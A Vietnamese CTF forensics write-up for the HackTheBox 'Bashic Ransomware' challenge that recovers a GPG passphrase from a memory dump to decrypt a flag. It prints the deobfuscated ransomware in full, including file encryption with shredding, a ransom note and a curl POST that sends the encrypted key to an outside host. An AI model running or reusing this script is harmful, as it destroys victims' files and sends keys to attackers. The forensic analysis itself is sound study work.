x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

Đây là bash shell. Chương trình đã bị obfuscated khiến cho việc phân tích trở nên khó khăn hơn. Khi mà ta ghép các biến lại thì nó sẽ tạo thành 1 chuỗi lệnh. 

Lệnh 
```bash
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW" 
``` 
sẽ ghép các biến đó với nhau thành 1 string là mã thực thi rồi dùng hàm ``eval()`` thực thi lệnh đó. 
Mình sẽ thay đổi ``eval()`` của biến x thành ``echo()``

Mình cho chạy file bash trên và bùm, nó in ra script bên trong. Có vẻ như đây là chương trình đã mã hoá file ``flag.txt``.
```bash= 
./script.sh
#!/bin/bash
uFMHx73AXNF6CTsbtzYM() {
        tljyVe4o7K3yOdj="LS0tLS1CRUdJTiBQR1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tCgptUUdOQkdQYTEvc0JEQURXRDlJRUV6VjNaanFNVnBuaXlEc0ZNQlFHR3l3ZzUwOEFlU0ZYRmxMM0syb0dGQ2p3CkViSTN2Kzh0eVlnNEFtNFE4aEhDaitqOGt2blIvQ3E1VkZPV1dzMjg3WVNHK294MEpWNTNyMy9MZGp5cENYN3YKcTc0N0FEYXdYZktaWXl4RkZUL25qMGtkOVVGcFo4RDE2SWh2aDAvVzNETklRd3NsMVIzcUU0TlNVSWl5WkxINQphbElWYzFnM0lzeHlDZXBiQXErUjJOZEFTWXRZdzM3NDV3Z2FhMUdsc3FSL04vd0QwMWlmaXNBbUxYV0xVUmRxClliU3lTeUM1V3h0cTlOZ3lRQUN5YXZGUEVzcC9VNmNKU2pmSGdUNGhzQmtoTFZhL29GVmxQdnIvdEhkSytXMHoKMkxmVTg0cVFoRXB3d3NYWHdOYWZvNE82ckJjNXBpQmYwa0FmbFh6VHZpdWhFcHRodTBtM3UxbWwydnIrNTc0Mwo1OGU4ODg4STRTOElLNE5PRUZFbzBHNC9nSUlZWU1ValExWXJMbmRZRlFkSzc4MUJBSnNkT2JLT3hFQk5vdVkxCkZCcjh0VjJCT1MxTDdBTjdrcU9FeGY2MWsxUVozdGtQWWZkWHdaKzVUL3kzYW5BcS8xQmtvUlljcUJwak9XMEsKUXlRYkU3bWNHNTdqNW04QUVRRUFBYlFkVW1GdWMyOXRTMlY1SUR4eVlXNXpiMjFBYUdGamF5NXNiMk5oYkQ2SgpBYzRFRXdFS0FEZ1dJUVFWWjZNdzBtTlFqZklJQUVqL1J3MGJrcFJpVmdVQ1k5clgrd0liQXdVTENRZ0hBZ1lWCkNna0lDd0lFRmdJREFRSWVBUUlYZ0FBS0NSRC9SdzBia3BSaVZ1YjBDLzQxeFV6c24vZzI1Njdad3BZdlhEeDcKaklHK2RIV0FhYndFUUZZa2J4VEN1a3FWbXhvQzhJZ0U4a0lQdDhvZ2V3SnI5d3dFY2VheTFkZTUxaDZuTFd0TgpFRUVDMEVQck1UQnAzVkhBOGgrbG1vZXB3NXNXNzRJeERkbTNJVU9WSmluRENlYmRxZGZXMnAwZmVwSjArZGl1Clh0cnE2RVNxblUyMFlNK2t4SlM4TkJYb2FlUkNISnRWLzg5ZnZYSWJoT285dmpsdS9YWHUrWTFpR1gyVHN3RFkKTmFheFc5Ymlrb2xHRzdXYkpUYk5XSEx2VTY4aGxsbWtaMDB6a0lSNHc2alc0TUJkTkZ6VFVSbEJ4MWlYbGw1SwpUQWVnWC9SdFZmeSt0aEdrbFJFQ3BPT1dpY1dCeFdyeTFKSW5UR1BtZnpKaEZWOU5WU0ROWEdteGZ1YVRXZUhICnRDMG9FMkxKZVlyakRNV0xnR0VXTERMYlhDdURtZXo1M0dwSjN2MHlGckplNGkyZVI1Z0x1OG9UNWlaV0xDNnYKMzdQeVc3bXYyeHZQNGNlZExZdk1CMVZ1UlBuSW01T1U2UjJtelNHQS8zNnBKWHhYU3RjY01JamJ5dDNUbFNxbAordHJyQ2ZHUzNjMzRzVmgrN1RNUHRHZTdCbHR4ZjI5UzhMd1dudUt1R00rNUFZMEVZOXJYK3dFTUFLNW0vdm1TCmJTb3p0cXFzV1dpNTN1UFJ3UWxqejZHd0g5emhDbENzRW4xZk9QRktZc0JLcmpFQXpsRUZ2VTh3UGhiVm5EdFAKNERtRFp0Wk9UN3pxSjFseUdXUnliOEdjSnpHWXYvRDJVcnZaMVZCUHBoUlVNU2lQZUljNnk0ckI5Vkh5ZjVRNApwdmFub1hlWVkyYVd4S09zdUl2aUJDRkJWalE0Q0dqbUlBMkZOdWFwZEFnSFZJRHZmTU9nblorbnRFNVdhSWZlCjBCdzlMK05OaTloV04vODlnMG9BeDNDVksybVVPUUJ3Z3NBR1kvdFdjc3lGc3YwWlRBLzczRXg0U05VMXdtUG0KeDNheVVsTjhhRENPMlhaanBpMitLY0NOV2hpYmFKbWp5SkZzK3ZIbzJ6TlpDaExGQWtObmZzSHczdHdTU1ZNQQovck56UE0zU2xhb2QvK2dDY0xEUEh0Y0xpcGF3RXlHcWRtd0hBakpTaEt4eFJpaG1YbzVoRjc1bUF3ckNSL2g5Ck1zb0phOW5DMDF5NXBMemZ4c1ZZRzBneXhyamdLVEpGcElCWDJ5SmtPSHlDMndrWUg2aVZxbDExMnRmOHpNZ3gKYWFmQnFqenNMZWNzcXZzYzA5SHRnZnpWZVM1bXpUN2dLajMxeXNuNjZxMCtmOVBXREJ5RzF3aHVUUUFSQVFBQgppUUcyQkJnQkNnQWdGaUVFRldlak1OSmpVSTN5Q0FCSS8wY05HNUtVWWxZRkFtUGExL3NDR3d3QUNna1EvMGNOCkc1S1VZbFpBOUF3QXRNOTVITk5QcWVqR0RwZmhmSUhWdy9HZkhKaGRpeUQ2NXJxWE5XckZFdzVJYVpVeWl0WUMKUFVPbmE3bGtFSW05aEkyaVpKc04vWEVnMWw5TVhpRzBHTzRqTjhvT0ZybnNHb3NNbUNJS2p3eDR5US9oTndKNQpuM3Fvb1cvRlErQTRQNmkvZDJERGtZK2NEdDhpUm1LTUhLa3dZcU9VV0hob2wwT3JwT1lYUUIrTjdwSFg5dCtaCld0NjU5YkxpUzRlcGt6YzRDUm9OSHZhZnY0bFdKaGJtWnowSitFd0U2QlBoNWN4WDA3aUEwbDdobjBQSW1jZ0gKKzdUL0xlZWZseHNKeXpiUWlXakd0UC9Ia2ZpbGg5ZStjSjZWcjlsNSs5SEFHaVB1L0JWK05qcTdCb2Mwc0lUKwpLbGFkVzJoUFV1WnQyeSsxaWg3NUtrZGdWb3k0amhhMENsTE9aQ1ZtODhNTXRLWXJ0S2ttZUkrMUtJVFE1NWhGCmRuYWZtaWdxcjB5M0dVTVBseFRRVmR5ZElnRHNzSXhWdlptWG8rd3lNbE4vL0hTS1Q5ZnpwOHhQL1g5bjhZWDcKcmZ1SkdBd3JKbWVLVFdHRWhrOUdOLzk2RTV6N2JOS2RQcWI5WHN3enF4QjMvVTBPWGRHemNpK1h6VURVVVI5cwo3S2dCZ3VXY0xXYWUKPXFqVzcKLS0tLS1FTkQgUEdQIFBVQkxJQyBLRVkgQkxPQ0stLS0tLQ=="
        echo $tljyVe4o7K3yOdj | base64 --decode | gpg --import
        echo -e "5\ny\n" | gpg --command-fd 0 --edit-key "RansomKey" trust
}

MMYPE1MNIGuGPBmyCUo6() {
        DhQ52B6UugM1WcX=`strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 16 | tr -d '\n'`
        echo $DhQ52B6UugM1WcX > RxgXlDqP0h3baha
        gpg --batch --yes -r "RansomKey" -o qgffrqdGlfhrdoE -e RxgXlDqP0h3baha
        shred -u RxgXlDqP0h3baha
        curl --request POST --data-binary "@qgffrqdGlfhrdoE" https://files.pypi-install.com/packages/recv.php

        for i in *.txt *.doc *.docx *.pdf *.kdbx *.gz *.rar;
        do
                if [[ ${i} != *"*."* ]];then
                        echo $DhQ52B6UugM1WcX | gpg --batch --yes -o "$i".a59ap --passphrase-fd 0 --symmetric --cipher-algo AES256 "$i" 2>/dev/null
                        shred -u "$i" 2>/dev/null
                fi
        done

        unset DhQ52B6UugM1WcX
}

v0nPa1GinWR3Dr27cnmT() {
    cat <<- EOF
                --------------------------------------------------------------------------
                YOUR FILES ARE ENCRYPTED BY AN EXTRATERRESTRIAL RANSOMWARE
                * What happened?
                        Most of your files are no longer accessible because they have been encrypted. Do not waste your time trying to find a way to decrypt them; it is impossible without our private key.
                * How to recover my files?
                        Recovering your files is 100% guaranteed if you follow our instructions. One file per infection can be decrypted as proof of work. To decrypt the rest, you must return the relic back to its previous rightful owners.
                * Is there a deadline?
                        Of course, there is. You have ten days left. Do not miss this deadline.
                --------------------------------------------------------------------------
        EOF
}

ExoPFDWb3uT189e() {
        uFMHx73AXNF6CTsbtzYM
        MMYPE1MNIGuGPBmyCUo6
        v0nPa1GinWR3Dr27cnmT
}

if [[ "$(whoami)" == "developer7669633432" ]]; then
        if [ -x "$(command -v gpg)" ]; then
                ExoPFDWb3uT189e
                exit 1
        fi
fi
```
Giải thích sơ qua về đoạn code:

Hàm ``uFMHx73AXNF6CTsbtzYM()``thực hiện decode khoá công khai đã bị mã hoá base64 rồi import vào gpg, sau đó đánh dấu khoá đấy với tên là "RansomKey".

Hàm ``MMYPE1MNIGuGPBmyCUo6()`` : 
Đầu tiên, biến ``DhQ52B6UugM1WcX`` được tạo ra bằng cách strings characters ngẫu nhiên trong streams được generates từ ``/dev/urandom``, sau đó ``grep`` lọc ra chỉ alphanumeric character, ``head -n 16`` in ra chỉ 16 characters đầu tiên của stream, ``tr -d '\n'`` delete newline character bất kỳ từ output. 

Sau đó nó gán giá trị của biến ``$DhQ52B6UugM1WcX`` vào biến ``RxgXlDqP0h3baha``, rồi mã hoá giá trị đấy vào biến ``qgffrqdGlfhrdoE``, xong việc thì xoá biến ``RxgXlDqP0h3baha`` đi rồi gửi lên ``https://files.pypi-install.com/packages/recv.php`` biến ``qgffrqdGlfhrdoE``.

Ban đầu mình nghĩ cái trang ``https://files.pypi-install.com/packages/recv.php`` vào được nhưng không. Trang này, sau khi dùng để tạo challenge thì họ xoá mất, lúc vào thì nó chuyển sang link rickroll =))))).

```bash
echo $DhQ52B6UugM1WcX > RxgXlDqP0h3baha
        gpg --batch --yes -r "RansomKey" -o qgffrqdGlfhrdoE -e RxgXlDqP0h3baha
        shred -u RxgXlDqP0h3baha
        curl --request POST --data-binary "@qgffrqdGlfhrdoE" https://files.pypi-install.com/packages/recv.php
```
 
Đoạn này mã hoá tất cả các file thành file ``.a59ap`` sử dụng AES 256 với khoá riêng là chuỗi nằm trong biến ``$DhQ52B6UugM1WcX``

```bash
for i in *.txt *.doc *.docx *.pdf *.kdbx *.gz *.rar;
        do
                if [[ ${i} != *"*."* ]];then
                        echo $DhQ52B6UugM1WcX | gpg --batch --yes -o "$i".a59ap --passphrase-fd 0 --symmetric --cipher-algo AES256 "$i" 2>/dev/null
                        shred -u "$i" 2>/dev/null
                fi
        done
```
``v0nPa1GinWR3Dr27cnmT()`` hàm này in tin tống tiền thôi nên mình sẽ bỏ nó đi lúc phân tích. 

``ExoPFDWb3uT189e()`` hàm này thực thi 2 hàm trên.

Đoạn code này kiểm tra xem người dùng có phải là ``developer7669633432`` thì thực hiện hàm ``ExoPFDWb3uT189e()`` để mã hoá dữ liệu.
```bash
if [[ "$(whoami)" == "developer7669633432" ]]; then
        if [ -x "$(command -v gpg)" ]; then
                ExoPFDWb3uT189e
                exit 1
        fi
fi
```
Okay, vậy là bây giờ mình cần phải tìm passphrase, tức là chuỗi ngẫu nhiên được tạo ra nằm trong biến ``$DhQ52B6UugM1WcX``. Vậy ta tìm ở đâu?

Khi check memory dump dùng plugin bash thì sẽ không tìm thấy vì tác giả có vẻ đã xoá lịch sử bash nên ta sẽ không tìm thấy gì trong đó. Nhưng, bạn biết công cụ hữu dụng và tuyệt vời nhất khi phân tích memory dump là gì không?
Đúng rồi đấy, ``STRINGS GREP``.
Ban đầu mình dùng lệnh grep tìm "gpg",...rồi tới tìm qua các lệnh nằm trong file bash như ``echo $DhQ52B6UugM1WcX`` thì tìm được data của biến `` tljyVe4o7K3yOdj`` :))), rồi suy nghĩ 1 hồi thì mình để ý thấy passphrase nó có 16 ký tự nên mình dùng regular expression tìm kiếm tất cả chuỗi có 16 ký tự. 

Mình dùng lệnh: ``strings forensics.mem | grep '^[a-zA-Z0-9]\{16\}$' -C 2`` để tìm, và bùm.

![](https://i.imgur.com/985LTud.png)

Mình dùng chuỗi trên và thay đổi code 1 tí để decrypt file ``flag.txt.a59ap``

```bash=
#!/bin/bash
uFMHx73AXNF6CTsbtzYM() {
        tljyVe4o7K3yOdj="LS0tLS1CRUdJTiBQR1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tCgptUUdOQkdQYTEvc0JEQURXRDlJRUV6VjNaanFNVnBuaXlEc0ZNQlFHR3l3ZzUwOEFlU0ZYRmxMM0syb0dGQ2p3CkViSTN2Kzh0eVlnNEFtNFE4aEhDaitqOGt2blIvQ3E1VkZPV1dzMjg3WVNHK294MEpWNTNyMy9MZGp5cENYN3YKcTc0N0FEYXdYZktaWXl4RkZUL25qMGtkOVVGcFo4RDE2SWh2aDAvVzNETklRd3NsMVIzcUU0TlNVSWl5WkxINQphbElWYzFnM0lzeHlDZXBiQXErUjJOZEFTWXRZdzM3NDV3Z2FhMUdsc3FSL04vd0QwMWlmaXNBbUxYV0xVUmRxClliU3lTeUM1V3h0cTlOZ3lRQUN5YXZGUEVzcC9VNmNKU2pmSGdUNGhzQmtoTFZhL29GVmxQdnIvdEhkSytXMHoKMkxmVTg0cVFoRXB3d3NYWHdOYWZvNE82ckJjNXBpQmYwa0FmbFh6VHZpdWhFcHRodTBtM3UxbWwydnIrNTc0Mwo1OGU4ODg4STRTOElLNE5PRUZFbzBHNC9nSUlZWU1ValExWXJMbmRZRlFkSzc4MUJBSnNkT2JLT3hFQk5vdVkxCkZCcjh0VjJCT1MxTDdBTjdrcU9FeGY2MWsxUVozdGtQWWZkWHdaKzVUL3kzYW5BcS8xQmtvUlljcUJwak9XMEsKUXlRYkU3bWNHNTdqNW04QUVRRUFBYlFkVW1GdWMyOXRTMlY1SUR4eVlXNXpiMjFBYUdGamF5NXNiMk5oYkQ2SgpBYzRFRXdFS0FEZ1dJUVFWWjZNdzBtTlFqZklJQUVqL1J3MGJrcFJpVmdVQ1k5clgrd0liQXdVTENRZ0hBZ1lWCkNna0lDd0lFRmdJREFRSWVBUUlYZ0FBS0NSRC9SdzBia3BSaVZ1YjBDLzQxeFV6c24vZzI1Njdad3BZdlhEeDcKaklHK2RIV0FhYndFUUZZa2J4VEN1a3FWbXhvQzhJZ0U4a0lQdDhvZ2V3SnI5d3dFY2VheTFkZTUxaDZuTFd0TgpFRUVDMEVQck1UQnAzVkhBOGgrbG1vZXB3NXNXNzRJeERkbTNJVU9WSmluRENlYmRxZGZXMnAwZmVwSjArZGl1Clh0cnE2RVNxblUyMFlNK2t4SlM4TkJYb2FlUkNISnRWLzg5ZnZYSWJoT285dmpsdS9YWHUrWTFpR1gyVHN3RFkKTmFheFc5Ymlrb2xHRzdXYkpUYk5XSEx2VTY4aGxsbWtaMDB6a0lSNHc2alc0TUJkTkZ6VFVSbEJ4MWlYbGw1SwpUQWVnWC9SdFZmeSt0aEdrbFJFQ3BPT1dpY1dCeFdyeTFKSW5UR1BtZnpKaEZWOU5WU0ROWEdteGZ1YVRXZUhICnRDMG9FMkxKZVlyakRNV0xnR0VXTERMYlhDdURtZXo1M0dwSjN2MHlGckplNGkyZVI1Z0x1OG9UNWlaV0xDNnYKMzdQeVc3bXYyeHZQNGNlZExZdk1CMVZ1UlBuSW01T1U2UjJtelNHQS8zNnBKWHhYU3RjY01JamJ5dDNUbFNxbAordHJyQ2ZHUzNjMzRzVmgrN1RNUHRHZTdCbHR4ZjI5UzhMd1dudUt1R00rNUFZMEVZOXJYK3dFTUFLNW0vdm1TCmJTb3p0cXFzV1dpNTN1UFJ3UWxqejZHd0g5emhDbENzRW4xZk9QRktZc0JLcmpFQXpsRUZ2VTh3UGhiVm5EdFAKNERtRFp0Wk9UN3pxSjFseUdXUnliOEdjSnpHWXYvRDJVcnZaMVZCUHBoUlVNU2lQZUljNnk0ckI5Vkh5ZjVRNApwdmFub1hlWVkyYVd4S09zdUl2aUJDRkJWalE0Q0dqbUlBMkZOdWFwZEFnSFZJRHZmTU9nblorbnRFNVdhSWZlCjBCdzlMK05OaTloV04vODlnMG9BeDNDVksybVVPUUJ3Z3NBR1kvdFdjc3lGc3YwWlRBLzczRXg0U05VMXdtUG0KeDNheVVsTjhhRENPMlhaanBpMitLY0NOV2hpYmFKbWp5SkZzK3ZIbzJ6TlpDaExGQWtObmZzSHczdHdTU1ZNQQovck56UE0zU2xhb2QvK2dDY0xEUEh0Y0xpcGF3RXlHcWRtd0hBakpTaEt4eFJpaG1YbzVoRjc1bUF3ckNSL2g5Ck1zb0phOW5DMDF5NXBMemZ4c1ZZRzBneXhyamdLVEpGcElCWDJ5SmtPSHlDMndrWUg2aVZxbDExMnRmOHpNZ3gKYWFmQnFqenNMZWNzcXZzYzA5SHRnZnpWZVM1bXpUN2dLajMxeXNuNjZxMCtmOVBXREJ5RzF3aHVUUUFSQVFBQgppUUcyQkJnQkNnQWdGaUVFRldlak1OSmpVSTN5Q0FCSS8wY05HNUtVWWxZRkFtUGExL3NDR3d3QUNna1EvMGNOCkc1S1VZbFpBOUF3QXRNOTVITk5QcWVqR0RwZmhmSUhWdy9HZkhKaGRpeUQ2NXJxWE5XckZFdzVJYVpVeWl0WUMKUFVPbmE3bGtFSW05aEkyaVpKc04vWEVnMWw5TVhpRzBHTzRqTjhvT0ZybnNHb3NNbUNJS2p3eDR5US9oTndKNQpuM3Fvb1cvRlErQTRQNmkvZDJERGtZK2NEdDhpUm1LTUhLa3dZcU9VV0hob2wwT3JwT1lYUUIrTjdwSFg5dCtaCld0NjU5YkxpUzRlcGt6YzRDUm9OSHZhZnY0bFdKaGJtWnowSitFd0U2QlBoNWN4WDA3aUEwbDdobjBQSW1jZ0gKKzdUL0xlZWZseHNKeXpiUWlXakd0UC9Ia2ZpbGg5ZStjSjZWcjlsNSs5SEFHaVB1L0JWK05qcTdCb2Mwc0lUKwpLbGFkVzJoUFV1WnQyeSsxaWg3NUtrZGdWb3k0amhhMENsTE9aQ1ZtODhNTXRLWXJ0S2ttZUkrMUtJVFE1NWhGCmRuYWZtaWdxcjB5M0dVTVBseFRRVmR5ZElnRHNzSXhWdlptWG8rd3lNbE4vL0hTS1Q5ZnpwOHhQL1g5bjhZWDcKcmZ1SkdBd3JKbWVLVFdHRWhrOUdOLzk2RTV6N2JOS2RQcWI5WHN3enF4QjMvVTBPWGRHemNpK1h6VURVVVI5cwo3S2dCZ3VXY0xXYWUKPXFqVzcKLS0tLS1FTkQgUEdQIFBVQkxJQyBLRVkgQkxPQ0stLS0tLQ=="
        echo $tljyVe4o7K3yOdj | base64 --decode | gpg --import
        echo -e "5\ny\n" | gpg --command-fd 0 --edit-key "RansomKey" trust
}

MMYPE1MNIGuGPBmyCUo6() {
        DhQ52B6UugM1WcX="wJ5kENwyu8amx2RM"
        echo $DhQ52B6UugM1WcX
        echo $DhQ52B6UugM1WcX | gpg --batch --yes --passphrase-fd 0 --decrypt --cipher-algo AES256 -o 'flag.txt' 'flag.txt.a59ap' 
}

ExoPFDWb3uT189e() {
        uFMHx73AXNF6CTsbtzYM
        MMYPE1MNIGuGPBmyCUo6
}


ExoPFDWb3uT189e
```
Và bùm

```command
./solve.sh
gpg: key FF470D1B92946256: "RansomKey <ransom@hack.local>" not changed
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg (GnuPG) 2.2.19; Copyright (C) 2019 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.


pub  rsa3072/FF470D1B92946256
     created: 2023-02-01  expires: never       usage: SC
     trust: ultimate      validity: ultimate
sub  rsa3072/A5CD1041D0B7CD60
     created: 2023-02-01  expires: never       usage: E
[ultimate] (1). RansomKey <ransom@hack.local>

pub  rsa3072/FF470D1B92946256
     created: 2023-02-01  expires: never       usage: SC
     trust: ultimate      validity: ultimate
sub  rsa3072/A5CD1041D0B7CD60
     created: 2023-02-01  expires: never       usage: E
[ultimate] (1). RansomKey <ransom@hack.local>

Please decide how far you trust this user to correctly verify other users' keys
(by looking at passports, checking fingerprints from different sources, etc.)

  1 = I don't know or won't say
  2 = I do NOT trust
  3 = I trust marginally
  4 = I trust fully
  5 = I trust ultimately
  m = back to the main menu


pub  rsa3072/FF470D1B92946256
     created: 2023-02-01  expires: never       usage: SC
     trust: ultimate      validity: ultimate
sub  rsa3072/A5CD1041D0B7CD60
     created: 2023-02-01  expires: never       usage: E
[ultimate] (1). RansomKey <ransom@hack.local>


pub  rsa3072/FF470D1B92946256
     created: 2023-02-01  expires: never       usage: SC
     trust: ultimate      validity: ultimate
sub  rsa3072/A5CD1041D0B7CD60
     created: 2023-02-01  expires: never       usage: E
[ultimate] (1). RansomKey <ransom@hack.local>

wJ5kENwyu8amx2RM
gpg: AES256 encrypted data
gpg: encrypted with 1 passphrase
```
Mở file đã decrypt lên: 

![](https://i.imgur.com/jcVE3Q2.png)

``Flag: HTB{n0_n33d_t0_r3turn_th3_r3l1c_1_gu3ss}``

Vâng, 4 tiếng của tôi, và idol Bquanman: ![](https://i.imgur.com/xtgoSov.png)

Cách tìm passphrase khác (cách này sau khi giải ra thì idol Bquanman chỉ cho):

Dùng plugin này: https://github.com/kudelskisecurity/volatility-gpg

Nhập lệnh và bùm:

```command
py vol.py -f 'C:\Users\kietbui\OneDrive - actvn.edu.vn\Documents\HackTheBox2023\forensics_bashic_ransomware\forensics.mem' -p 'C:\Users\kietbui\tool\volatility-gpg\' linux.gpg_full --fast
Volatility 3 Framework 2.4.1
Progress:  100.00               Stacking attempts finished
Offset  Private key     Secret size     Plaintext
Searching from 24 Mar 2023 13:41:08 UTC to 12 Sep 2023 06:06:55 UTC

0x7f96f0002038  86246ef7da91e80ac9f1587bf8d93e76        32      wJ5kENwyu8amx2RM
0x7f96f0002038  86246ef7da91e80ac9f1587bf8d93e76        32      wJ5kENwyu8amx2RM
```
Tài liệu đọc thêm: https://www.nas.nasa.gov/hecc/support/kb/using-gpg-to-encrypt-your-data_242.html





































































































